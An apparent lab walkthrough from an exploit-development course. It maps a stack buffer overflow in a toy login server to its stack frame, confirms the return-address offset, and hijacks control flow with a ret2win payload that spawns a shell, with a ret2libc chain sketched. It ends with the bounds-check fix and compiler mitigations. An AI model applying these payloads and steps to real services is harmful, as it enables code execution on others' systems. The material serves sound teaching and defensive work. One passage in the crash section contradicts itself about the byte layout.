# Walkthrough 1 — A Realistic Login Server, Mapped to Memory

This is a **full program** (`server.c`, ~160 lines) structured like a real
network daemon: a framing layer, a session structure, a dispatcher, and
per-command handlers. It contains one production-style bug — a handler trusts a
client-supplied length and copies into a fixed stack buffer. We map **every
relevant line to the exact bytes it touches in memory**, then exploit it, then
fix it.

> Lab only. Build and run in a throwaway VM. Disable ASLR for the exploit:
> `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`.

Files: [`server.c`](server.c) · [`exploit.py`](exploit.py)

---

## 0. Build

```bash
gcc -g -O0 -fno-stack-protector -no-pie server.c          -o server       # vuln
gcc -g -O0 -fno-stack-protector -no-pie -DWITH_WIN server.c -o server_win  # + win()
gcc -g -O0 -fno-stack-protector -no-pie -DSAFE server.c    -o server_safe  # fixed
gcc -g -O0 -fsanitize=address             server.c          -o server_asan # detector
```

Normal run:
```bash
$ python3 exploit.py normal | ./server
protocol server ready
LOGIN: user='alice' uid=1000 auth=1
```

---

## 1. The data path — from input bytes to the vulnerable copy

Trace **how a byte on the wire reaches the bug.** This "data path" view is how
you audit real code: follow untrusted input to a dangerous sink.

```
stdin bytes
  -> main(): read_u8(&type), read_u32(&length)          [framing header]
  -> main(): malloc(length); read_exact(payload,length) [whole payload in heap]
  -> dispatch: switch(type) case CMD_LOGIN
  -> handle_login(&s, payload, length)
       -> memcpy(&name_len, payload, 4)        name_len = ATTACKER's first 4 bytes
       -> memcpy(name, payload+4, name_len)     <-- SINK: size is attacker-chosen
```

The payload sits in a **heap** buffer (`malloc` in `main`), fully attacker-
controlled. `handle_login` copies a slice of it into a **stack** buffer `name`
using `name_len`, which is *also* attacker-controlled (it's the first 4 bytes of
the payload). Untrusted size + fixed destination = overflow.

The protocol framing is realistic: `[u8 type][u32 length][payload]`, and for
LOGIN the payload is `[u32 name_len][name][u8 pin[4]]`. `exploit.py`'s
`login_payload()` builds exactly this.

---

## 2. Mapping `handle_login`'s locals to its stack frame

Compile and disassemble to get the **real offsets** (yours may differ by build;
re-check with `objdump -d -M intel server`):

```asm
<handle_login>:
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0x50            ; reserve 80 bytes for locals
  mov    [rbp-0x38], rdi      ; s        (session pointer, arg1)
  mov    [rbp-0x40], rsi      ; payload  (arg2)
  mov    [rbp-0x44], edx      ; plen     (arg3)
  ...
  mov    [rbp-0x28], eax      ; name_len  <- stored here
  lea    rax, [rbp-0x20]      ; &name     <- memcpy destination
  call   memcpy              ; memcpy(name, payload+4, name_len)
  lea    rax, [rbp-0x24]      ; &pin
  ...
```

From those instructions, the frame looks like this (high address at top). This
is the diagram to keep in front of you:

```
   ADDRESS            CONTENTS                         SIZE
   rbp+0x08  ---->     RETURN ADDRESS of handle_login   8   <=== the prize
   rbp+0x00  ---->     saved RBP (caller's)             8
   rbp-0x20 .. rbp-0x01  name[0 .. 31]                 32   <=== memcpy dst
   rbp-0x24 .. rbp-0x21  pin[0 .. 3]                    4
   rbp-0x28  ---->     name_len (u32)                   4
   rbp-0x38  ---->     s        (saved rdi)             8
   rbp-0x40  ---->     payload  (saved rsi)             8
   rbp-0x44  ---->     plen     (saved edx)             4
   (rsp)                                                ...
```

**Key observation:** `name` starts at `rbp-0x20` and is 32 bytes, so it ends
exactly at `rbp+0x00` — the saved RBP. The return address is the 8 bytes right
after that, at `rbp+0x08`. And notice `pin` and `name_len` live at **lower**
addresses than `name` (rbp-0x24, rbp-0x28), so the overflow — which writes
**upward** from `name` — does *not* pass through them on its way to the return
address. That's why the offset is clean.

---

## 3. The byte map — overflow offset derived from the frame

`memcpy(name, payload+4, name_len)` writes `name_len` bytes starting at
`rbp-0x20`. Counting from the first byte of `name`:

```
name bytes  0 .. 31   -> fill name[32]            (rbp-0x20 .. rbp-0x01)
name bytes 32 .. 39   -> overwrite saved RBP      (rbp+0x00 .. rbp+0x07)
name bytes 40 .. 47   -> overwrite RETURN ADDRESS (rbp+0x08 .. rbp+0x0f)   <===
```

So the **offset from the start of the copied data to the saved return address is
40**. Supply a `name_len` ≥ 48 and bytes 40–47 become the new return address.

---

## 4. Confirm the offset empirically (never trust the math alone)

Feed a **cyclic (De Bruijn) pattern** as the name, crash it, and read which
4-byte window landed in the return slot:

```bash
# generate a LOGIN whose name is a unique-window pattern (pwntools or the helper
# in exploit.py), run under gdb, let it crash at `ret`, then read [rsp]:
gdb -q -batch -ex 'run < pat.bin' -ex 'x/gx $rsp' ./server_win
# -> 0x...: 0x6c6161616b616161   ("aaakaaal")
```

Find "aaak" in the pattern → index **40**. Math and measurement agree. On a build
with different padding you'd discover the real number here instead of guessing.

---

## 5. Reproduce the crash

```bash
$ python3 exploit.py crash | ./server
protocol server ready
LOGIN: user='AAAA...'(31) uid=0 auth=0
Segmentation fault            # ret jumped to 0x4343434343434343 ("CCCC...")
```

`exploit.py crash` sends `name_len = 200` and a 200-byte name =
`b"A"*40 + b"B"*8 + b"C"*152`. Bytes 40–47 are `"CCCCCCCC"`... actually the
layout puts `"B"*8` over the saved RBP and the following bytes over the return
address — run it under ASan to see the write pinpointed:

```bash
$ python3 exploit.py crash | ./server_asan
==...==ERROR: AddressSanitizer: stack-buffer-overflow ... WRITE of size 200
    #0 ... in handle_login server.c:... 'name'
```

ASan reports the destination object (`name`, 32 bytes) and the overflowing
`memcpy` — the exact line, no guesswork.

---

## 6. Weaponize — ret2win (control-flow hijack)

`server.c` ships a hidden `win()` under `-DWITH_WIN` that spawns a shell; it is
never called on the normal path, so reaching it proves we control execution.

```bash
$ addr=$(objdump -d server_win | awk '/<win>:/{print $1}')   # e.g. 4013a2
$ (python3 exploit.py ret2win; echo 'id; cat /etc/hostname') | ./server_win
protocol server ready
LOGIN: user='AAAA...'(31) uid=1000 auth=1
[win] handle_login's return address was hijacked -> shell (lab only)
uid=1000(user) ...            # we are running commands in the spawned shell
```

`exploit.py ret2win` builds `name = b"A"*40 + p64(win_addr)`: 40 bytes of filler
put us exactly at the return slot, then `win`'s address overwrites it. When
`handle_login` executes `leave; ret`, `ret` pops our `win` address into `rip`.

> If `win()` crashes *inside* `system` instead of giving a shell, it's the
> x86-64 16-byte alignment rule (`movaps`): insert a bare `ret` gadget before
> `win_addr` (one extra `p64(ret_gadget)`), which shifts `rsp` by 8. pwntools'
> `ROP()` inserts it automatically. See Chapter 12 §2.6.

For the full ROP/ret2libc version (no `win()` present, NX on), apply Chapter 12:
leak libc via `puts(puts@got)`, then chain `pop rdi; ret` → `&"/bin/sh"` →
`system`. The offset (40) and the sink are identical; only the payload after the
offset changes.

---

## 7. The fix, mapped to the same code

The bug is one missing bound. `-DSAFE` compiles this path:

```c
if (name_len > sizeof(name) || (uint64_t)name_len + 4 > plen) {
    puts("LOGIN: bad name length");
    return;
}
memcpy(name, payload + 4, name_len);
```

Two checks, both necessary:
1. `name_len > sizeof(name)` — never write past the 32-byte destination (stops
   the overflow).
2. `(uint64_t)name_len + 4 > plen` — never read past the payload we actually
   received (stops an **out-of-bounds read** of the heap buffer, Chapter 9).
   The cast to `uint64_t` prevents the addition itself from overflowing
   (Chapter 8).

Confirm the same attack now fails safely:
```bash
$ python3 exploit.py crash | ./server_safe
protocol server ready
LOGIN: bad name length
```

Defense in depth (Chapter 13): build with `-fstack-protector-strong` (a canary
between `name` and the return address aborts on overwrite), `-fPIE -pie`
(randomizes `win`/gadget addresses), and fuzz the parser with
`-fsanitize=address` so this never ships.

---

## 8. What to take away

- **Follow untrusted input to its sink.** The bug wasn't hidden — `name_len`
  flows from the first payload bytes straight into a `memcpy` size.
- **The stack frame is knowable.** Three instructions (`lea [rbp-0x20]`, the
  `memcpy`, the prologue `sub rsp,0x50`) told us `name` is 40 bytes below the
  return address.
- **Offset = destination size + saved RBP**, here `32 + 8 = 40`, and we
  *verified* it with a cyclic pattern.
- **The fix is one validated bound**, plus layered mitigations.

Next: a realistic **heap** program with UAF and overflow, mapped to chunks →
[`../02-note-manager/WALKTHROUGH.md`](../02-note-manager/WALKTHROUGH.md).
